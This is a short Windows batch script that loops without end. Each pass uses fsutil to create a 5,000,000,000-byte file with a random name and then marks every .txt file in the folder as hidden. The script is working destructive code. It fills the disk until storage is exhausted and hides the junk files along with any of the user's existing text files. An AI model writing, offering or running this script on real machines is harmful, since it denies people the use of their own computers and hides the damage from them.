:: Create large randomly named text files repeatedly

@echo off

:Begin
	:: Create an "empty" text file that happens to be 5000000000 bytes large 
	fsutil file createnew %random%.txt 5000000000
	
	:: Hide the created text file
	attrib +h *.txt

Goto Begin